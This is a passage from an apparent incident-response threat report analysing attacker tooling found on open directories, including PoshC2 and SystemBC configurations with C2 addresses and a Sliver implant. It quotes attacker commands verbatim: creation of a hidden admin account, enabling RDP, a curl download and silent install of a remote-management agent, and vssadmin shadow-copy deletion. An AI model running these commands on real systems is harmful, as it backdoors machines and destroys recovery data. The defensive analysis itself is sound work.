<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37171" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_040.png" alt="" width="2506" height="238" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_040.png 2506w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_040-300x28.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_040-1024x97.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_040-768x73.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_040-1536x146.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_040-2048x195.png 2048w" sizes="(max-width: 2506px) 100vw, 2506px" /></a></figure>
<p>&nbsp;</p>



<h3 id="c14" class="wp-block-heading"><strong>ngrok.exe</strong></h3>



<p>This binary is legitimate and signed <a href="https://www.virustotal.com/gui/file/1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386/detection" target="_blank" rel="noreferrer noopener">ngrok agent</a>.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37172" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_041.png" alt="" width="636" height="463" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_041.png 636w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_041-300x218.png 300w" sizes="(max-width: 636px) 100vw, 636px" /></a></figure>



<p>Some AV vendors tag it as malicious with a PUP category. The presence of this binary in your environment can be a great indicator of compromise if you are not using it.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37173" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_042.png" alt="" width="1830" height="1998" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_042.png 1830w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_042-275x300.png 275w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_042-938x1024.png 938w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_042-768x839.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_042-1407x1536.png 1407w" sizes="(max-width: 1830px) 100vw, 1830px" /></a></figure>
<p>&nbsp;</p>



<h3 id="c15" class="wp-block-heading"><strong>ON.bat</strong></h3>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37174" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_043.png" alt="" width="948" height="510" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_043.png 948w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_043-300x161.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_043-768x413.png 768w" sizes="(max-width: 948px) 100vw, 948px" /></a></figure>



<p>This type of command was used by Blackbyte, Promethus, Phobos and other ransomware groups as part of their playbook to perform configuration on several services. Aside from starting multiple services using net start command, below are the configuration changes using sc command</p>



<p><em>sc.exe config Dnscache start= auto</em></p>



<ul class="wp-block-list">
<li>Caches DNS names and registers the full computer name for your computer</li>
</ul>



<p>sc.exe config SSDPSRV start= auto</p>



<ul class="wp-block-list">
<li>Enables discovery of UPnP devices on your home network</li>
</ul>



<p>sc.exe config FDResPub start= auto</p>



<ul class="wp-block-list">
<li>Publishes your computer and resources attached to your computer so they can be discovered over the network</li>
</ul>



<p><em>sc.exe config upnphost start= auto</em></p>



<ul class="wp-block-list">
<li>Allows UPnP devices to be hosted on your computer</li>
</ul>



<p><strong>References:</strong></p>



<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://www.linkedin.com/pulse/english-blackbyte-ransomware-misterious-dropper-encoder-fasolo">https://www.linkedin.com/pulse/english-blackbyte-ransomware-misterious-dropper-encoder-fasolo</a></div>
</figure>



<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://www.cybereason.com/blog/research/cybereason-vs.-prometheus-ransomware">https://www.cybereason.com/blog/research/cybereason-vs.-prometheus-ransomware</a></div>
</figure>



<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://blog.talosintelligence.com/understanding-the-phobos-affiliate-structure">https://blog.talosintelligence.com/understanding-the-phobos-affiliate-structure</a></div>
<div> </div>
</figure>
<h3 id="c16" class="wp-block-heading"><strong>PoshC2</strong></h3>



<p>The Posh_v2_dropper_x64.exe is, as its name states, a <a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noreferrer noopener">PoshC2</a> dropper. Specifically, the sample is a C++ CLR (<a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="noreferrer noopener">Common Language Runtime</a>, a.k.a. .NET) loader which executes a PoshC2 PowerShell Dropper with the below reconstructed configuration.</p>



<pre class="wp-block-preformatted">{
  "ConnectURL": "/webhp/",
  "Key": "bX7WACSlpm2NpvJdQbRV8DHAjmEJpKWM8n4bkG6bzCI=",
  "KillDate": "2999-12-01",
  "URLID": 1,
  "PayloadCommsHost": "https://94.198.53.143",
  "StageRetriesLimit": 30,
  "StageRetries": true,
  "StageRetriesInitialWait": 60,
  "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"
}
</pre>



<p>The usage of the <a href="https://github.com/nettitude/PoshC2/blob/517903431ab43e6d714b24b0752ba111f5d4c2f1/resources/config-template.yml#L22" target="_blank" rel="noreferrer noopener">default kill date</a> and <a href="https://github.com/nettitude/PoshC2/blob/517903431ab43e6d714b24b0752ba111f5d4c2f1/poshc2/server/Config.py#L132-L137" target="_blank" rel="noreferrer noopener">TLS certificate</a> (besides all other tools and &#8220;geographic&#8221; location) are common indications of the C2 being adversary instead of red team infrastructure. At the time of writing, the Posh Command &amp; Control service is still actively responding.</p>



<p>Hunting for additional PoshC2 infrastructure can be done <a href="https://search.censys.io/search?resource=hosts&amp;q=services.tls.certificates.leaf_data.issuer.common_name%3A+%22P18055077%22" target="_blank" rel="noreferrer noopener">through the default TLS certificate settings</a>.</p>



<h3 id="c17" class="wp-block-heading"><strong>native_dropper</strong></h3>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37175" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_044.png" alt="" width="3490" height="234" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_044.png 3490w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_044-300x20.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_044-1024x69.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_044-768x51.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_044-1536x103.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_044-2048x137.png 2048w" sizes="(max-width: 3490px) 100vw, 3490px" /></a></figure>



<p>native_dropper is the Linux version of Posh_v2_dropper_x64.exe, which is the Windows version of it. By checking the hash of this file (<a href="https://www.virustotal.com/gui/file/63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d/details" target="_blank" rel="noreferrer noopener">63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d</a>), we can see that it is now flagged by most of the AV vendors as malicious with 58/72 ratings.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37176" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_045.png" alt="" width="3974" height="1918" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_045.png 3974w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_045-300x145.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_045-1024x494.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_045-768x371.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_045-1536x741.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_045-2048x988.png 2048w" sizes="(max-width: 3974px) 100vw, 3974px" /></a></figure>



<p>Performing a quick string reveals the configuration of this PoshC2. <a href="https://packetwatch.com/resources/threat-intel/python-poshc2-ioc-analysis" target="_blank" rel="noreferrer noopener">Packetwatch</a> also discussed it on their blog last year.</p>



<pre class="wp-block-preformatted">domain_front_hdr=94.198.53.143
server_clean=https://94.198.53.143
ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
proxy_url=
proxy_user=
proxy_pass=
urls=webhp/
urls=adsense/troubleshooter/1631343/
urls=trader-update/history&amp;pd=/
urls=status/995598521343541248/query=/
urls=uasclient/0.1.34/modules/
urls=utag/lbg/main/prod/utag.15.js/
urls=GoPro5/black/2018/
urls=usersync/tradedesk/
urls=bootstrap/3.1.1/bootstrap.min.js/
urls=TOS/
urls=business/home.asp&amp;ved=/
urls=web/20110920084728/
urls=vssf/wppo/site/bgroup/visitor/
urls=Philips/v902/
urls=bh/sync/aol/
urls=async/newtab/
urls=advanced_search/
urls=adServingData/PROD/TMClient/6/8736/
urls=vfe01s/1/vsopts.js/
urls=cisben/marketq/
urls=business/retail-business/insurance.asp/
urls=client_204/
urls=branch-locator/search.asp/
urls=work/embedded/search/
urls=babel-polyfill/6.3.14/polyfill.min.js=/
urls=cdba/
urls=putil/2018/0/11/po.html/
urls=qqzddddd/2018/load.php/
urls=types/translation/v1/articles/
urls=classroom/sharewidget/widget_stable.html/
jitter=0.2
sleep_time=5
kill_date=32501019600
</pre>



<h3 id="c18" class="wp-block-heading"><strong>poshc2+user.txt</strong></h3>



<p>While analyzing the files, the ones we observed on the second IP after pivoting with Shodan (185.234.216.64:8000), one additional thing that caught our attention was the poshc2+user.txt file. Let&#8217;s take a look at the content of this text file.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37177" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_046.png" alt="" width="3354" height="1614" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_046.png 3354w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_046-300x144.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_046-1024x493.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_046-768x370.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_046-1536x739.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_046-2048x986.png 2048w" sizes="(max-width: 3354px) 100vw, 3354px" /></a></figure>



<p>The text file contains multiple commands that we will be dividing into four parts:</p>



<p><strong>1: PowerShell encoded commands</strong></p>



<p>Below are the PowerShell decoded commands. The download link mentioned on the below decoded commands is not accessible anymore.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37178" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_047.png" alt="" width="1315" height="53" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_047.png 1315w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_047-300x12.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_047-1024x41.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_047-768x31.png 768w" sizes="(max-width: 1315px) 100vw, 1315px" /></a></figure>



<p><strong>2: Creation of User Account</strong></p>



<p>The below commands are used to create a user account &#8220;WDAGUtil<strong>l</strong>tyAccount&#8221; with a password of &#8220;Ujmqaz5055&#8221;. After creating this account, it will be added to the administrator local group. Notice that this user was trying to masquerade the common system account in Windows &#8220;WDAGUtilityAccount&#8221; with a little typo of &#8220;l&#8221; instead of &#8220;i&#8221;.</p>



<pre class="wp-block-preformatted">net user WDAGUtilltyAccount Ujmqaz5055 /add
net localgroup Administrators WDAGUtilltyAccount /add
</pre>



<p><strong>3: Enable Remote Desktop Protocol</strong></p>



<p>These commands are divided into two parts. The first one is registry modification, which is used to enable Remote Desktop Protocol (RDP) on a Windows machine by setting the value of &#8220;fDenyTSConnections&#8221; to &#8220;0&#8221;. The second command manipulates and configures the Windows Firewall to allow inbound RDP connections by opening TCP port 3389.</p>



<pre class="wp-block-preformatted">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
</pre>



<p><strong>4: Download and Install Atera Agent</strong></p>



<p>The provided commands utilize &#8216;curl&#8217; to download the Atera Agent installation setup file, specifying the necessary Gmail and account ID. Upon executing the entire command sequence, the &#8216;setup.exe&#8217; file for the Atera Agent was successfully downloaded without encountering any issues.</p>



<pre class="wp-block-preformatted">curl -o setup.msi "https://HelpdeskSupport613811560.servicedesk.atera.com/GetAgent/Msi/?customerId=1&amp;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="41282f3524263320352e330d2e26282f7c252035282d3320262f2001262c20282d6f222e2c">[email&#160;protected]</a>&amp;accountId=&lt;redacted&gt;" &amp;&amp; msiexec /i setup.msi /qn  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d49dbaa0b1b3a6b5a0bba698bbb3bdbae9b0b5a0bdb8a6b5b3bab594b3b9b5bdb8fab7bbb9">[email&#160;protected]</a> CompanyId=1 AccountId=&lt;redacted&gt;
</pre>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37179" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_049.png" alt="" width="2064" height="1274" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_049.png 2064w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_049-300x185.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_049-1024x632.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_049-768x474.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_049-1536x948.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_049-2048x1264.png 2048w" sizes="(max-width: 2064px) 100vw, 2064px" /></a></figure>
<p>&nbsp;</p>



<h3 id="c19" class="wp-block-heading"><strong>py_dropper.sh</strong></h3>



<p>This script is an encoded PoshC2 Python payload dropper.</p>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37180" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_050.png" alt="" width="1343" height="501" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_050.png 1343w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_050-300x112.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_050-1024x382.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_050-768x286.png 768w" sizes="(max-width: 1343px) 100vw, 1343px" /></a></p>



<p>Decoding the base64 encoded blob results in the following Python script:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37181" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_051.png" alt="" width="1269" height="817" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_051.png 1269w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_051-300x193.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_051-1024x659.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_051-768x494.png 768w" sizes="(max-width: 1269px) 100vw, 1269px" /></a></figure>



<p>This script is a configured version of <a href="https://github.com/nettitude/PoshC2/blob/master/resources/payload-templates/dropper.py" target="_blank" rel="noreferrer noopener">https://github.com/nettitude/PoshC2/blob/master/resources/payload-templates/dropper.py</a> . Decoding it gives us several insights and IOCs (C2 IP, callback URLs, UA) on the threat actor&#8217;s infrastructure and methods. The configuration of settings in this sample, match the same ones observed in the prior samples mentioned, indicating that they were generated during the same server build.</p>



<h3 id="c20" class="wp-block-heading"><strong>setup_uncnow.mmsi</strong></h3>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37182" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_052.png" alt="" width="1044" height="788" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_052.png 1044w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_052-300x226.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_052-1024x773.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_052-768x580.png 768w" sizes="(max-width: 1044px) 100vw, 1044px" /></a></figure>



<p>This installer deploys the Atera agent, which is part of a remote monitoring and management tool. This tool has commonly misused by various threat actors for intrusions.</p>



<h3 id="c21" class="wp-block-heading"><strong>shadow.bat</strong></h3>



<p>Contrary to what the script name indicates, this script focus on more than just Volume Shadow Copies.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37183" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_053.png" alt="" width="1426" height="849" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_053.png 1426w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_053-300x179.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_053-1024x610.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_053-768x457.png 768w" sizes="(max-width: 1426px) 100vw, 1426px" /></a></figure>



<p>The script uses two commands vssadmin.exe Delete Shadows /All /Quiet and vssadmin delete shadows /all to delete all shadow copies of files and folders on the system.</p>



<p>The script also performs multiple defense evasion techniques by disabling Windows Defender, enabling RDP, and backdooring the system by replacing the accessibility features by cmd.exe as previously seen in cmd.cmd script.</p>



<h3 id="c22" class="wp-block-heading"><strong>shadowGuru.bat</strong></h3>



<p>This script has two main functions. It first uses the net share command to share several drives with full access permissions to everyone on the network:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37184" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_054.png" alt="" width="1104" height="708" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_054.png 1104w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_054-300x192.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_054-1024x657.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_054-768x493.png 768w" sizes="(max-width: 1104px) 100vw, 1104px" /></a></figure>



<p>Then, it uses a condition to perform several registry cleanups and modifications related to AV programs:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37185" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_055.png" alt="" width="4166" height="566" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_055.png 4166w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_055-300x41.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_055-1024x139.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_055-768x104.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_055-1536x209.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_055-2048x278.png 2048w" sizes="(max-width: 4166px) 100vw, 4166px" /></a></figure>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37186" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_056.png" alt="" width="4360" height="654" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_056.png 4360w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_056-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_056-1024x154.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_056-768x115.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_056-1536x230.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_056-2048x307.png 2048w" sizes="(max-width: 4360px) 100vw, 4360px" /></a></figure>



<p>The conditional statement is based on the system architecture PROCESSOR_ARCHITECTURE check, and make registry modifications accordingly. Depending on whether the system is 32-bit or 64-bit, registry changes are made using appropriate paths (/reg:32 or /reg:64).</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37187" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_057.png" alt="" width="2042" height="1134" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_057.png 2042w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_057-300x167.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_057-1024x569.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_057-768x426.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_057-1536x853.png 1536w" sizes="(max-width: 2042px) 100vw, 2042px" /></a></figure>
<p>&nbsp;</p>



<h3 id="c23" class="wp-block-heading"><strong>VmManagedSetup.exe</strong></h3>



<p>The VmManagedSetup.exe<a href="https://tria.ge/240129-1w33ladccq" target="_blank" rel="noreferrer noopener">executable was identified</a> as SystemBC, a malware strain known to perform initial reconnaissance and deliver follow-up malware on select targets. Upon starting, the malware immediately persists itself.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37188" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_058.png" alt="" width="511" height="79" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_058.png 511w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_058-300x46.png 300w" sizes="(max-width: 511px) 100vw, 511px" /></a></figure>



<p>This SystemBC sample does so through run-key persistence. Specifically, it creates the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run key of value socks5, intended to execute the sample through PowerShell. While this approach is far from stealthy, SystemBC is known to infect miss-managed corporate devices, often lacking security software.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37189" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_059.png" alt="" width="665" height="539" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_059.png 665w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_059-300x243.png 300w" sizes="(max-width: 665px) 100vw, 665px" /></a></figure>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37190" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_060.png" alt="" width="835" height="73" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_060.png 835w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_060-300x26.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_060-768x67.png 768w" sizes="(max-width: 835px) 100vw, 835px" /></a></figure>



<p>After persistence has been established, SystemBC launches its main thread. As shown below, SystemBC starts by launching a separate kill-switch thread, listening locally to avoid concurrent runs. The malware then periodically beacons, alternating between two C2s.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_061.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37191" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_061.png" alt="" width="507" height="375" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_061.png 507w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_061-300x222.png 300w" sizes="(max-width: 507px) 100vw, 507px" /></a></figure>



<p>To evade detection, SystemBC ensures its configuration is only decrypted to establish the C2 connection. The malware supports both IPs and host names as C2 addresses.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37192" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_062.png" alt="" width="558" height="645" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_062.png 558w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_062-260x300.png 260w" sizes="(max-width: 558px) 100vw, 558px" /></a></figure>



<p>The XOR-decoded configuration exposes both SystemBC servers as 94.198.55.181:4337 and 94.198.51.247:4337.</p>



<pre class="wp-block-preformatted">00000000  42 45 47 49 4e 44 41 54 41 48 4f 53 54 31 3a 39  |BEGINDATAHOST1:9|
00000010  34 2e 31 39 38 2e 35 35 2e 31 38 31 00 00 00 00  |4.198.55.181....|
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 48 4f 53 54 32 3a 39 34 2e  |.......HOST2:94.|
00000040  31 39 38 2e 35 31 2e 32 34 37 00 00 00 00 00 00  |198.51.247......|
00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 50 4f 52 54 31 3a 34 33 33 37 00  |.....PORT1:4337.|
00000070  00                                               |.|
</pre>



<p>As SystemBC&#8217;s main functionality is to deploy additional malware, its download logic provides additional IoCs. As outlined below, the VmManagedSetup.exe executable is capable of fetching additional payloads using a GET request over HTTP/1.0. The employed user agent is:</p>
<pre>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</pre>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37193" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_063.png" alt="" width="860" height="344" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_063.png 860w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_063-300x120.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_063-768x307.png 768w" sizes="(max-width: 860px) 100vw, 860px" /></a></figure>



<p>Its noteworthy that the download functionality relies on the default hard-coded port INTERNET_DEFAULT_HTTP_PORT, indicative of plain HTTP communications on port 80. These types of communications typically empower organizations to detect suspicious activity through network appliances.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37194" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_064.png" alt="" width="505" height="450" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_064.png 505w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_064-300x267.png 300w" sizes="(max-width: 505px) 100vw, 505px" /></a></figure>



<p>Reference:</p>



<ul class="wp-block-list">
<li><a href="https://www.virustotal.com/gui/file/cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2/detection" target="_blank" rel="noreferrer noopener">https://www.virustotal.com/gui/file/cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2/detection</a></li>
</ul>



<h3 id="c24" class="wp-block-heading"><strong>WILD_PRIDE.exe</strong></h3>



<p>The WILD_PRIDE.exe executable is a <a href="https://github.com/BishopFox/sliver" target="_blank" rel="noreferrer noopener">Sliver</a> implant, an open-source adversary <em>&#8220;emulation&#8221;</em> framework. As the Sliver framework is written in Go and obfuscated using <a href="https://github.com/moloch--/garble" target="_blank" rel="noreferrer noopener">garble</a>, relying on <a href="https://www.joesandbox.com/analysis/1352543/0/html#behavior-graph" target="_blank" rel="noreferrer noopener">dynamic analysis</a> provides the easiest method for C2 identification, which for this sample is the 94[.]198[.]53[.]143 open-directory server.</p>



<p>Sliver relies on <a href="https://en.wikipedia.org/wiki/Protocol_Buffers" target="_blank" rel="noreferrer noopener">Protobuf</a> to serialize command &amp; control communications, which luckily, aren&#8217;t as easily obfuscated. By performing a string analysis against the project&#8217;s Protobuf definitions (identifying <a href="https://github.com/BishopFox/sliver/compare/v1.5.39..v1.5.40#diff-83e4cb648dd1c6a38e0ee4fa4e923ad5a88b3e4ad0fe5d890179f16618cd6675" target="_blank" rel="noreferrer noopener">included</a> and <a href="https://github.com/BishopFox/sliver/compare/v1.5.41..v1.5.42#diff-83e4cb648dd1c6a38e0ee4fa4e923ad5a88b3e4ad0fe5d890179f16618cd6675" target="_blank" rel="noreferrer noopener">excluded</a> changes in protobuf/sliverpb/sliver.proto), we were able to scope down the implant version to likely 1.5.40 or 1.5.41, released mid-2023 to address <a href="https://github.com/advisories/GHSA-8jxm-xp43-qh3q" target="_blank" rel="noreferrer noopener">CVE-2023-34758</a>.</p>



<figure class="wp-block-image"></figure>
